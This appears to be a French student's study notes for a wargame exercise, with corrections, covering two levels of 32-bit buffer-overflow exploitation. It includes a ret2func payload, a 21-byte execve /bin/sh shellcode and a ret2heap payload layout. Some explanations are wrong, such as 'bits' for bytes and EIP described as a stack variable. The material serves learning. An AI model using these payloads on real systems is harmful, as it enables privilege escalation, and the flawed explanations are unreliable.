# Questions de Sécurité - Buffer Overflow & Exploitation

## Level 1 : Buffer Overflow Basique

### 1. Buffer Overflow

#### Qu'est-ce qu'un buffer overflow ? Explique avec tes mots ce qui se passe en mémoire.

Un buffer overflow est ce qui se passe lorsqu'on affecte plus de valeurs à un buffer que ce qu'il a été initialisé pour au départ. Par exemple, dans level1, le buffer est attribué 76 bits dans la mémoire, mais un buffer overflow serait de lui donner 80 ou 100 bits à stocker, ce qui ferait dépasser la place dédiée pour le buffer dans la mémoire.

#### Pourquoi envoyer 100 'A' cause un segfault ?

Parce qu'on fait un buffer overflow, et on va chercher des informations là où il n'est pas censé y en avoir.

#### Quelle est la différence entre écraser EIP et écraser d'autres variables sur la stack ?

EIP est la variable dans la stack qui garde en mémoire l'adresse de retour du programme. Si on l'écrase et qu'on lui donne une nouvelle adresse par exemple, alors à la fin du programme, c'est à cette nouvelle adresse que le programme va retourner.

---

### 2. La fonction run()

Tu as trouvé une fonction `run()` à l'adresse `0x08048444`.

#### Pourquoi cette fonction existe-t-elle si elle n'est jamais appelée dans le code normal ?

C'est la fonction "faille" du programme que l'on doit exploiter. Il va falloir écraser la valeur dans EIP par l'adresse de cette fonction pour pouvoir lancer `/bin/sh`.

#### Comment sais-tu que cette fonction est intéressante pour l'exploitation ?

Quand on lit la fonction, on voit qu'elle permet de lancer `/bin/sh`, ce qui va nous permettre ensuite de cat le password en tant que lvl2, car on a vu avant que l'exécutable s'exécute en tant que user level2.

#### Que se passerait-il si tu appelais directement run() depuis ton shell (sans exploit) ?

Je ne sais pas comment faire ça, mais j'imagine qu'on aurait un `/bin/sh` qui se lance, mais sans les droits utilisateurs de level2.

---

### 3. L'offset

Tu notes : "Si EIP = 0x42424242 (BBBB) → offset = 76"

#### Qu'est-ce que EIP ? À quoi sert ce registre ?

Comme dit avant, EIP est la variable dans la stack qui garde en mémoire l'adresse de retour du programme. Si on l'écrase et qu'on lui donne une nouvelle adresse par exemple, alors à la fin du programme, c'est à cette nouvelle adresse que le programme va retourner.

#### Pourquoi chercher à contrôler EIP spécifiquement ?

Même réponse que pour la question juste avant.

#### Comment as-tu déterminé que l'offset est exactement 76 ? (méthodologie)

Dans Ghidra, en décompilant le code on voit : `char buffer[76]`

Mais sinon, on peut tester empiriquement en balançant dans le programme avec GDB :

```bash
python -c "print('A' * 76 + 'BBBB')"
```

Et on regarde ensuite la valeur de EIP en ayant mis un break juste avant le return.

---

### 4. Little-endian

Tu convertis `0x08048444` en `\x44\x84\x04\x08`.

#### Qu'est-ce que le little-endian ? Pourquoi l'ordre des octets est-il inversé ?

C'est la façon dont communique notre ordinateur pour les adresses. Je ne sais pas trop plus par rapport à ça, éclaire moi.

#### Si l'adresse était 0xdeadbeef, quelle serait la représentation little-endian ?

`\xef\xbe\xad\xde`

#### Pourquoi l'architecture x86 utilise-t-elle le little-endian ?

Je ne sais pas. Explique moi.

---

### 5. Le payload

Ta commande :

```bash
bash(printf 'AAA...AAA\x44\x84\x04\x08'; cat) | ./level1
```

#### Pourquoi utiliser (printf ...; cat) au lieu de juste printf ?

Afin d'avoir un bash qui tourne en continu. D'ailleurs je voudrais changer ce printf en utilisant `python -c "print"`. Quelle serait la bonne commande ?

#### Que fait exactement la commande cat ici ?

Elle permet de faire tourner `/bin/sh` en continu.

#### Que se passerait-il sans le cat ?

Le programme s'arrêterait.

---

### 6. La stack

#### Dessine (ou décris) la stack avant et après le buffer overflow.

Je ne sais pas.

#### Où se trouve le buffer dans la stack par rapport à EIP ?

76 octets avant ?

#### Pourquoi 76 octets exactement ? Que représentent ces octets ?

Je ne sais pas.

---

## Level 2 : Contournement des Protections

### 1. Protection anti-stack

Tu mentionnes : "Le programme a une protection qui bloque les adresses commençant par 0xb"

#### Pourquoi les adresses de la stack commencent-elles par 0xb ?

Je ne sais pas.

**Réponse fournie :** C'est la plage d'adresses réservée par Linux pour la stack en architecture 32-bit.

#### Comment le programme détecte-t-il qu'une adresse commence par 0xb ?

Avec une comparaison.

#### Quelle partie du code implémente cette vérification ? (as-tu vu ça dans Ghidra ?)

Je l'ai vu dans Ghidra, c'est dans la fonction `p()`.

---

### 2. Le heap

Tu utilises `ltrace` pour trouver l'adresse heap : `0x0804a008`

#### Qu'est-ce que le heap ? En quoi est-il différent de la stack ?

| Caractéristique | Stack | Heap |
|---|---|---|
| **Croissance** | Vers le bas (adresses décroissantes) | Vers le haut (adresses croissantes) |
| **Allocation** | Automatique (variables locales) | Manuelle (`malloc`, `strdup`) |
| **Taille** | Fixe (définie au lancement) | Dynamique (s'agrandit si besoin) |
| **Vitesse** | Rapide (juste déplacer ESP) | Plus lent (gestion de la free list) |
| **Adresses** | `0xbfxxxxxx` (hautes) | `0x0804xxxx` (basses) |
| **Durée de vie** | Jusqu'à la fin de la fonction | Jusqu'au `free()` |

#### Pourquoi l'adresse heap commence-t-elle par 0x08 au lieu de 0xb ?

Je ne sais pas.

**Réponse fournie :** Organisation de l'espace d'adressage.

#### Pourquoi utiliser strdup() ? Que fait cette fonction exactement ?

La fonction `strdup()` renvoie un pointeur sur une nouvelle chaîne de caractères qui est dupliquée depuis la chaîne qui lui est donnée en argument. Je pense qu'elle ne fait pas de vérification de buffer, ce qui permet de l'exploiter.

**Réponse fournie :** Correct. voici plus de precisions:

Pourquoi exploitable ?
- strdup() copie TOUT ce qu'on lui donne (y compris notre shellcode)
- Pas de vérification de longueur
- Alloue sur le heap (adresse 0x08... → pas bloquée !)

#### Est-ce que l'adresse 0x0804a008 est toujours la même à chaque exécution ? Pourquoi ?

Pas tout le temps, mais souvent. Non ?

---

### 3. Le shellcode

Tu utilises un shellcode de 21 octets :

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

#### Qu'est-ce qu'un shellcode ? Explique avec tes mots.

Le shellcode est un langage qui permet d'injecter un script dans le programme.

**Correction** : Un shellcode est du **code machine** (assembleur compilé en bytes), pas un langage.

**Définition précise** :
```
Shellcode = Suite d'instructions assembleur en hexadécimal
            qu'on injecte dans un programme vulnérable
            pour exécuter du code arbitraire
```	
**Exemple** :
```asm
; Code assembleur (lisible par les humains)
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80

↓ Compilé en bytes (exécutable par le CPU)

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

```

#### Pourquoi 21 octets spécifiquement ? As-tu trouvé ce shellcode ou l'as-tu créé ?

J'ai trouvé ce shellcode, mais 21 parce qu'il ne faut pas qu'il ne dépasse l'offset non ?

**Correction** : La taille du shellcode n'est pas liée à l'offset directement.

**Contraintes** :
1. ✅ Doit être assez petit pour tenir dans le buffer (< 80 octets ici)
2. ✅ Pas de bytes NULL (\x00) → casserait la chaîne pour gets()
3. ✅ Plus court = mieux (plus de place pour le padding)

#### Que fait ce shellcode en assembleur ? (pas besoin de détailler chaque instruction, juste l'idée générale)

Il permet de lancer un `/bin/sh`.

**Reponse** : correct! **Appel système** execve("/bin/sh", NULL, NULL) 

**detail** : 
```asm
push 0x0b        ; syscall number (execve = 11)
pop eax
cdq              ; met edx à 0 (environ)
push edx         ; NULL terminator
push 0x68732f2f  ; "//sh"
push 0x6e69622f  ; "/bin"
mov ebx, esp     ; ebx pointe vers "/bin//sh"
xor ecx, ecx     ; argv = NULL
int 0x80         ; syscall
```

#### Pourquoi injecter du code au lieu de sauter vers une fonction existante (comme run() dans level1) ?

Parce qu'il n'y en a pas qui permettent d'exploiter une faille.

---

### 4. L'offset

Tu notes : "Si affiche (0xbfffffbf) → offset = 80"

#### Comment as-tu déterminé que l'offset est 80 ? (méthodologie)

Je ne sais plus, mais pense qu'il aurait été judicieux de refaire une méthode avec pattern non ?

**méthode avec pattern cyclique** :
```
$ gdb level2
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A...
^D

Program received signal SIGSEGV
(gdb) info registers eip
eip  0x41366441  # "dA6A" en ASCII
# Chercher "dA6A" dans le pattern → position 80
```

#### Pourquoi tester avec \xbf\xff\xff\xbf spécifiquement ?

Je ne sais plus.

**Réponse** :
- C'est une adresse de la stack (commence par 0xb)
- Si le programme affiche (0xbfffffbf) → la protection a détecté notre adresse
- Ça confirme que l'offset est bon ET que la protection fonctionne

#### Est-ce que l'offset est le même que dans level1 (76) ? Si différent, pourquoi ?

Je ne sais plus.

**Réponse**:
Level1 : offset = 76
Level2 : offset = 80
Explication : La différence vient de strdup() !

Layout de la stack - Level1
```
cvoid main(void) {
    char buffer[64];  // NON ! C'est local_50[76]
    gets(buffer);
}
```

**Stack** :
```
┌─────────────────┐ ← ESP
│  local_50[76]   │ 76 octets
├─────────────────┤
│  Saved EBP      │ 4 octets (souvent écrasé par le buffer)
├─────────────────┤
│  Saved EIP      │ 4 octets ← On veut écraser ici
└─────────────────┘

Offset = 76 (pas de padding entre buffer et saved EIP)
```

Layout de la stack - Level2
```
cvoid p(void) {
    char local_50[76];
    unsigned int ret_addr;  // ← Variable supplémentaire !
    
    gets(local_50);
}
```

**Stack** :
```
┌─────────────────┐ ← ESP
│  local_50[76]   │ 76 octets
├─────────────────┤
│  ret_addr       │ 4 octets ← Variable locale supplémentaire
├─────────────────┤
│  Saved EBP      │ 4 octets
├─────────────────┤
│  Saved EIP      │ 4 octets ← On veut écraser ici
└─────────────────┘

Offset = 76 + 4 = 80 octets
```
La différence : La variable ret_addr (qui stocke la saved return address lue depuis la stack) prend 4 octets supplémentaires !

---

### 5. Le padding

Structure du payload :

```
Shellcode (21 octets) + Padding (59 octets) + Adresse (4 octets)
```

#### Pourquoi 59 octets de padding exactement ? Comment as-tu calculé ce nombre ?

Parce que `80 (offset) - 21 (shellcode) = 59 (padding)`.

#### Vérification : 21 + 59 + 4 = 84. Mais tu dis offset = 80. Il y a une différence de 4 octets, pourquoi ?

Je ne sais plus.

#### Que se passerait-il si tu mettais 60 octets de padding au lieu de 59 ?

Je ne sais pas, ça ne marcherait pas ? Pourquoi ?

**Réponse** :
l'adresse commencerait a 81, pas 80, ce qui ne permttrait pas d'ecraser EIP correctement.

---

### 6. ltrace vs GDB

Tu utilises `ltrace` pour trouver l'adresse heap.

#### Quelle est la différence entre ltrace et strace ?

Je ne sais pas.
| Outil | trace | exemple |
|---|---|---|
| **ltrace** | Appels de bibliothèque (libc) | strdup(), printf(), malloc() |
| **strace** | Appels système (kernel) | open(), read(), write(), execve() |

#### Pourquoi ltrace plutôt que GDB pour trouver l'adresse heap ?

Plus simple ?


**Réponse** : strdup() affiche directement l'adresse de retour !

#### Si tu n'avais pas ltrace, comment trouverais-tu l'adresse heap autrement ?

GDB ? et je cherche EAX ? Pas sûr.

---

### 7. Le déroulement de l'exploitation

#### Décris étape par étape ce qui se passe quand tu envoies ton payload :

**a. Où va le shellcode en mémoire ?**

Je ne sais pas.
```
gets(local_50);  // Lit notre payload dans local_50 (sur la STACK)
strdup(local_50); // Copie local_50 sur le HEAP à 0x0804a008
```

**Mémoire** :
```
STACK (0xbfxxxxxx) :
  [Shellcode 21][Padding 59][0x0804a008]
                              ^^^^^^^^^^^
                              Adresse heap

HEAP (0x0804a008) :
  [Shellcode 21][Padding 59][0x0804a008]
   ^^^^^^^^^^^^^
   Notre code exécutable !
```

**b. Que fait strdup() avec ton input ?**

Il écrase EIP ?

**Correction** : `strdup()` ne fait **rien** à EIP directement.

**Séquence** :
1. `gets()` écrit notre payload sur la stack → **écrase saved EIP**
2. `strdup()` copie le payload sur le heap
3. La fonction `p()` fait `ret`
4. `ret` charge saved EIP → `0x0804a008` (notre adresse heap)
5. Le CPU saute à `0x0804a008`
6. Exécute notre shellcode ! ✅

**c. Comment EIP finit-il par pointer vers ton shellcode ?**

Buffer overflow.

**Réponse**: Buffer overflow écrase saved EIP avec `0x0804a008`.

#### Pourquoi cette technique s'appelle "ret2heap" ?

Je ne sais pas.
**ret2heap** = **Return-to-heap**

**Nomenclature des exploits** :
```
ret2func  : Retourner vers une fonction existante (level1)
ret2libc  : Retourner vers une fonction de la libc
ret2heap  : Retourner vers du code sur le heap (level2) ✅
ret2shellcode : Retourner vers du shellcode (générique)
ROP       : Return-Oriented Programming (chaîner des gadgets)

#### Quelle est la différence principale entre l'exploitation de level1 et level2 ?

Je ne sais pas.